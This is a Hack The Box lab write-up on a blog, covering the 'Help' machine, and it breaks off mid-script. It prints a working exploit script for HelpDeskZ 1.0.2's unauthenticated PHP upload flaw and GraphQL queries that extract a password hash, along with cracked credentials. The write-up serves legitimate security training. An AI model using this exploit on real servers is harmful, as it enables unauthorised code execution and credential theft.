<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Help - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Help from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Help">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/help/">


  <meta property="og:description" content="My write-up / walkthrough for Help from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Help">
  <meta name="twitter:description" content="My write-up / walkthrough for Help from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/help/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-06-08T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/help/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Help">
    <meta itemprop="description" content="Hack The Box - Help">
    <meta itemprop="datePublished" content="2019-06-08T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/help/" class="u-url" itemprop="url">Hack The Box - Help
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-06-08T07:00:00+02:00">June 8, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          10 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---help">Hack The Box - Help</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-initial-enumeration">HTTP Initial Enumeration</a></li>
<li><a href="#file-upload-vulnerability">File Upload Vulnerability</a></li>
<li><a href="#nodejs-getting-credentials">Node.js, Getting Credentials</a></li>
<li><a href="#file-upload-exploitation-reverse-shell-and-user-flag">File Upload Exploitation, Reverse Shell and User Flag</a></li>
<li><a href="#kernel-exploit-privilege-escalation-and-root-flag">Kernel Exploit, Privilege Escalation and Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---help">Hack The Box - Help</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called <code class="language-plaintext highlighter-rouge">HelpDeskZ</code>. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.121</code> I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">help.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/help/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC help.htb</code>
<br><img src="/images/hackthebox/help/1.png" alt="" class="align-center"><br><br>
We got <code class="language-plaintext highlighter-rouge">ssh</code> on port 22 and <code class="language-plaintext highlighter-rouge">http</code> on two ports : 80 and 3000. What’s running on port 80 is an <code class="language-plaintext highlighter-rouge">Apache2</code> server and on port 3000 is <code class="language-plaintext highlighter-rouge">Node.js Express Framework</code>.<br></p>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p>On port 80 there’s just the default <code class="language-plaintext highlighter-rouge">Apache</code> index page :
<br><img src="/images/hackthebox/help/2.png" alt="" class="align-center"><br><br>
So I ran <code class="language-plaintext highlighter-rouge">gobuster</code> and got these results :
<code class="language-plaintext highlighter-rouge">gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://help.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/06/07 13:03:25 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
=====================================================
2019/06/07 13:05:25 Finished
=====================================================
</code></pre></div></div>
<p>I went to <code class="language-plaintext highlighter-rouge">/support</code> and there was a web application called <code class="language-plaintext highlighter-rouge">HelpDeskZ</code> :
<br><img src="/images/hackthebox/help/3.png" alt="" class="align-center"><br><br></p>

<h2 id="file-upload-vulnerability">File Upload Vulnerability</h2>
<p>A quick search and I found an <a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener noreferrer">unauthenticated file upload vulnerability</a> that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload <code class="language-plaintext highlighter-rouge">php</code> files because they are allowed by default.<br></p>

<blockquote>
  <p>HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.<br>
The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. -<a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener noreferrer">exploit-db</a></p>
</blockquote>

<p>I wanted to test if I can really upload <code class="language-plaintext highlighter-rouge">php</code> so I went to <code class="language-plaintext highlighter-rouge">Submit a Ticket</code> and I attached a test file :
<br><img src="/images/hackthebox/help/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/help/5.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/help/6.png" alt="" class="align-center"><br><br>
And I got <code class="language-plaintext highlighter-rouge">File is not allowed.</code>
Luckily <code class="language-plaintext highlighter-rouge">HelpDeskZ</code> is an open-source application so I checked the source on <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github</a>.<br>
The script that handles tickets submissions is called <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">new-ticket.php</code></a>. It can be found in <code class="language-plaintext highlighter-rouge">includes/parser</code>.<br>
Here’s the part for the attachments :
<br><img src="/images/hackthebox/help/7.png" alt="" class="align-center"><br><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$attachments</span><span class="p">)){</span>
		<span class="nv">$save_dir</span> <span class="o">=</span> <span class="no">UPLOAD_DIR</span><span class="p">;</span>
		<span class="k">foreach</span><span class="p">(</span><span class="nv">$attachments</span> <span class="k">as</span> <span class="nv">$attachment</span><span class="p">)</span> <span class="p">{</span>
		  <span class="c1">// get the attachment name</span>
		  <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">;</span>
		  <span class="c1">// write the file to the directory you want to save it in</span>
		  <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$save_dir</span><span class="mf">.</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">))</span> <span class="p">{</span>
			<span class="k">while</span><span class="p">(</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">())</span> <span class="p">{</span>
			  <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
		  <span class="p">}</span>
			
		  <span class="nv">$filesize</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="no">UPLOAD_DIR</span><span class="mf">.</span><span class="nv">$filename</span><span class="p">);</span>
		  <span class="k">if</span><span class="p">(</span><span class="nv">$filesize</span><span class="p">){</span>
			  <span class="nv">$fileinfo</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nv">$filename</span><span class="p">,</span> <span class="s1">'size'</span> <span class="o">=&gt;</span> <span class="nv">$filesize</span><span class="p">);</span>
			  <span class="nv">$fileverification</span> <span class="o">=</span> <span class="nf">verifyAttachment</span><span class="p">(</span><span class="nv">$fileinfo</span><span class="p">);</span>
			  <span class="k">if</span><span class="p">(</span><span class="nv">$fileverification</span><span class="p">[</span><span class="s1">'msg_code'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
				<span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="no">PATHINFO_EXTENSION</span><span class="p">);</span>
				<span class="nv">$filename_encoded</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$filename</span><span class="mf">.</span><span class="nb">time</span><span class="p">())</span><span class="mf">.</span><span class="s2">"."</span><span class="mf">.</span><span class="nv">$ext</span><span class="p">;</span>
				<span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nv">$filename</span><span class="p">,</span> <span class="s1">'enc'</span> <span class="o">=&gt;</span> <span class="nv">$filename_encoded</span><span class="p">,</span> <span class="s1">'filesize'</span> <span class="o">=&gt;</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="s1">'ticket_id'</span> <span class="o">=&gt;</span> <span class="nv">$ticketid</span><span class="p">,</span> <span class="s1">'msg_id'</span> <span class="o">=&gt;</span> <span class="nv">$message_id</span><span class="p">,</span> <span class="s1">'filetype'</span> <span class="o">=&gt;</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="n">content_type</span><span class="p">);</span>
				<span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">insert</span><span class="p">(</span><span class="no">TABLE_PREFIX</span><span class="mf">.</span><span class="s2">"attachments"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
				<span class="nb">rename</span><span class="p">(</span><span class="no">UPLOAD_DIR</span><span class="mf">.</span><span class="nv">$filename</span><span class="p">,</span> <span class="no">UPLOAD_DIR</span><span class="mf">.</span><span class="s1">'tickets/'</span><span class="mf">.</span><span class="nv">$filename_encoded</span><span class="p">);</span>
			  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
				<span class="nb">unlink</span><span class="p">(</span><span class="no">UPLOAD_DIR</span><span class="mf">.</span><span class="nv">$filename</span><span class="p">);</span>
			  <span class="p">}</span>
		  <span class="p">}</span>
		<span class="p">}</span>
</code></pre></div></div>
<p>It takes the file and uploads it then there’s an <code class="language-plaintext highlighter-rouge">if</code> statement that checks the result of passing <code class="language-plaintext highlighter-rouge">$fileinfo</code> to a function called <code class="language-plaintext highlighter-rouge">verifyAttachment</code>. If the function returned <code class="language-plaintext highlighter-rouge">0</code> it will rename the file. If it’s not <code class="language-plaintext highlighter-rouge">0</code> it will delete the file (<code class="language-plaintext highlighter-rouge">unlink(UPLOAD_DIR.$filename)</code>) . This function can be found in <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">functions.php</code></a> in <code class="language-plaintext highlighter-rouge">includes/</code>.<br>
<code class="language-plaintext highlighter-rouge">verifyAttachment()</code> :
<br><img src="/images/hackthebox/help/8.png" alt="" class="align-center"><br><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">verifyAttachment</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
	<span class="k">global</span> <span class="nv">$db</span><span class="p">;</span>	
	<span class="nv">$namepart</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
	<span class="nv">$totalparts</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$namepart</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="nv">$file_extension</span> <span class="o">=</span> <span class="nv">$namepart</span><span class="p">[</span><span class="nv">$totalparts</span><span class="p">];</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">ctype_alnum</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">)){</span>
		<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="nv">$filetype</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">fetchRow</span><span class="p">(</span><span class="s2">"SELECT count(id) AS total, size FROM "</span><span class="mf">.</span><span class="no">TABLE_PREFIX</span><span class="mf">.</span><span class="s2">"file_types WHERE type='"</span><span class="mf">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">real_escape_string</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">)</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">[</span><span class="s1">'total'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
		<span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$filename</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
			<span class="nv">$misc</span> <span class="o">=</span> <span class="nf">formatBytes</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]);</span>
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>	
			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'msg_code'</span> <span class="o">=&gt;</span> <span class="nv">$msg_code</span><span class="p">,</span> <span class="s1">'msg_extra'</span> <span class="o">=&gt;</span> <span class="nv">$misc</span><span class="p">);</span>
	<span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return <code class="language-plaintext highlighter-rouge">0</code> and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : <code class="language-plaintext highlighter-rouge">File is not allowed.</code> is meaningless.<br>
If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time.<br>
If we take a look at the exploit :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">print</span> <span class="s">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage: {} [baseUrl] [nameOfUploadedFile]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">())</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"found!"</span>
        <span class="k">print</span> <span class="n">url</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"Sorry, I did not find anything"</span>
</code></pre></div></div>
<p>We can solve this problem by iterating over a higher range than 300 : <code class="language-plaintext highlighter-rouge">for x in range(0, 300)</code>
This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours.<br></p>

<h2 id="nodejs-getting-credentials">Node.js, Getting Credentials</h2>
<p>We saw earlier that port 3000 was open and running <code class="language-plaintext highlighter-rouge">Node.js Express framework</code> and we haven’t looked at that yet.<br>
<br><img src="/images/hackthebox/help/9.png" alt="" class="align-center"><br><br>
By going to <code class="language-plaintext highlighter-rouge">http://help.htb:3000/</code> I got this response of a message saying : <code class="language-plaintext highlighter-rouge">"Hi Shiv, To get access please find the credentials with given query"</code>, I tried <code class="language-plaintext highlighter-rouge">/test</code> and got this :
<br><img src="/images/hackthebox/help/10.png" alt="" class="align-center"><br><br>
tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about <code class="language-plaintext highlighter-rouge">node.js</code>, <code class="language-plaintext highlighter-rouge">node.js</code> queries and other related stuff. After a lot of attempts to find something when I tried <code class="language-plaintext highlighter-rouge">/graphql</code> I got this response :
<br><img src="/images/hackthebox/help/11.png" alt="" class="align-center"><br><br>
So I added <code class="language-plaintext highlighter-rouge">?query</code> and got a syntax error :
<code class="language-plaintext highlighter-rouge">http://help.htb:3000/graphql?query</code>
<br><img src="/images/hackthebox/help/12.png" alt="" class="align-center"><br><br>
That’s fine, I tried requesting a query, for example <code class="language-plaintext highlighter-rouge">user</code> :
<code class="language-plaintext highlighter-rouge">http://help.htb:3000/graphql?query={user}</code> :
<br><img src="/images/hackthebox/help/13.png" alt="" class="align-center"><br><br>
It says that <code class="language-plaintext highlighter-rouge">user</code> must have a selection of subfields so I tried <code class="language-plaintext highlighter-rouge">username</code> :
<code class="language-plaintext highlighter-rouge">http://help.htb:3000/graphql?query={user{username}}</code> :
<br><img src="/images/hackthebox/help/14.png" alt="" class="align-center"><br><br>
Great, let’s get the password : 
<code class="language-plaintext highlighter-rouge">http://help.htb:3000/graphql?query={user{password}}</code> :
<br><img src="/images/hackthebox/help/15.png" alt="" class="align-center"><br><br>
I used <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a> to crack the hash and got this password : 
<code class="language-plaintext highlighter-rouge">5d3c93182bb20f07b994a7f617e99cff</code> : <code class="language-plaintext highlighter-rouge">godhelpmeplz</code>
Now we have the credentials : <code class="language-plaintext highlighter-rouge">helpme@helpme.com : godhelpmeplz</code></p>

<h2 id="file-upload-exploitation-reverse-shell-and-user-flag">File Upload Exploitation, Reverse Shell and User Flag</h2>
<p>I edited the path of the uploads in the exploit, instead of <code class="language-plaintext highlighter-rouge">helpdeskzBaseUrl+md5hash+'.php'</code> I made it :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="s">'/uploads/tickets/'</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
</code></pre></div></div>
<p>I got that path from the <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github repository</a>).<br>
Exploit after edits :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">print</span> <span class="s">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage: {} [baseUrl] [nameOfUploadedFile]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">())</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="s">'/uploads/tickets/'</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"found!"</span>
